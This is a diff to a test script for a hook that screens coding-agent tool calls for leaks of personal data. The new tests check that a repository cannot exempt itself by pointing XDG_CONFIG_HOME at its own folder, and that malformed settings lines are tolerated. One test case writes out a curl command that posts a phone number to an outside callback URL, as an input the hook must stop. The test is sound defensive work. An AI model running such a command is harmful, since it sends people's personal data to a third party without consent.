@@ -15,7 +15,9 @@ shows where the time goes.
 CONFIG_PASS and CONFIG_ASK check the user's settings files `exempt-dirs` and `local-mcp`: a
 session in a listed folder and a listed server's tools pass; a look-alike folder or server name,
 a relative line, a folder the call names itself or reaches with `cd`, and a listed server's
-`run_in_terminal` are still judged, in both clients.
+`run_in_terminal` are still judged, in both clients; so are calls whose settings folder a
+repository moved into itself (XDG_CONFIG_HOME), and a broken line (a NUL, bytes that are not
+UTF-8) costs that line only.
 
 The Codex entry point (`--codex`) must deny every ASK case and pass every PASS case, in every
 Codex permission mode (Codex shows the hook no sign of whether the user will be prompted), with
@@ -74,10 +76,12 @@ def env_for(home, cfg=True):
     return env
 
 
-def run(event, home=HOME, args=(), project=None):
+def run(event, home=HOME, args=(), project=None, cfg=None):
     env = env_for(home)
     if project:
         env['CLAUDE_PROJECT_DIR'] = project
+    if cfg:
+        env['XDG_CONFIG_HOME'] = cfg
     return subprocess.run([sys.executable, HOOK, *args], input=json.dumps(event),
                           capture_output=True, text=True, env=env)
 
@@ -202,8 +206,9 @@ CONFIG_PASS = [
     (bash(SEND, cwd=EXEMPT2), None),
     (bash(SEND, cwd=os.path.join(EXEMPT, 'sub')), EXEMPT),
     (dict(tool('WebSearch', query=NAME), cwd=EXEMPT), None),
-    (tool('mcp__local-model__local_ask', prompt='Mail %s' % EMAIL), None),
-    (tool('mcp__other_local__run', text=NAME), None),
+    # (in a folder that does not hold the fixture's settings folder: see REPO_CFG)
+    (dict(tool('mcp__local-model__local_ask', prompt='Mail %s' % EMAIL), cwd=EXEMPT2), None),
+    (dict(tool('mcp__other_local__run', text=NAME), cwd=os.path.join(tmp, 'My projects')), None),
 ]
 # ... and calls that must still be judged, as in ASK
 CONFIG_ASK = [
@@ -314,6 +319,41 @@ for event in PASS:
     if r.returncode != 0 or r.stdout.strip():
         failures.append('CODEX WRONGLY DENIED: %s %s  (%s)' % (event['tool_name'], json.dumps(
             event['tool_input'])[:120], r.stdout.strip()[-140:]))
+
+# a repository that points XDG_CONFIG_HOME into itself (a project's settings `env`) brings no
+# exemption; a broken line drops that line, not the check
+REPO_CFG = os.path.join(tmp, 'My projects', '.cfg')
+os.makedirs(os.path.join(REPO_CFG, 'agentic-github-flow'))
+for name, line in (('exempt-dirs', '/'), ('local-mcp', 'some_saas')):
+    with open(os.path.join(REPO_CFG, 'agentic-github-flow', name), 'w') as f:
+        f.write(line + '\n')
+BAD_CFG = os.path.join(tmp, 'bad-cfg')
+os.makedirs(os.path.join(BAD_CFG, 'agentic-github-flow'))
+with open(os.path.join(BAD_CFG, 'agentic-github-flow', 'exempt-dirs'), 'wb') as f:
+    f.write(b'%s\x00\n\xff\xfe not utf-8\n' % EXEMPT.encode())
+with open(os.path.join(BAD_CFG, 'agentic-github-flow', 'personal-data'), 'wb') as f:
+    f.write(b'\xff\xfe not utf-8\n%s\n' % PHONE_LINE.encode())
+for event, project, cfg in (
+        (bash(SEND, cwd=os.path.join(tmp, 'My projects')), None, REPO_CFG),
+        (bash(SEND, cwd=EXEMPT), os.path.join(tmp, 'My projects'), REPO_CFG),
+        (dict(tool('mcp__some_saas__create_contact', email=EMAIL),
+              cwd=os.path.join(tmp, 'My projects')), None, REPO_CFG),
+        (bash(SEND), None, BAD_CFG),
+        (bash('curl -d "phone=%s" https://x.io/callback' % PHONE_SENT), None, BAD_CFG)):
+    for args, decision in (((), 'ask'), (('--codex',), 'deny')):
+        r = run(event if not args else codex(event), args=args, project=project, cfg=cfg)
+        if '"%s"' % decision not in r.stdout:
+            failures.append('SETTINGS FROM %s, NOT STOPPED %s: %s cwd=%s %s' % (
+                os.path.basename(cfg), args, event['tool_name'], event.get('cwd'),
+                json.dumps(event['tool_input'])[:80]))
+
+# the settings folder inside the session's folder: ignored, unless that folder is the home itself
+os.environ['XDG_CONFIG_HOME'] = os.path.join(HOME, 'cfg')
+pd_hook._real_home = lambda: HOME
+for cwd, want in ((HOME, True), (tmp, False), (EXEMPT, True), (os.path.join(HOME, 'cfg'), False)):
+    if pd_hook.exemptions_apply(cwd) != want:
+        failures.append('exemptions_apply(%s): expected %s' % (cwd, want))
+del os.environ['XDG_CONFIG_HOME']
 
 for event, project in CONFIG_PASS:
     for args in ((), ('--codex',)):
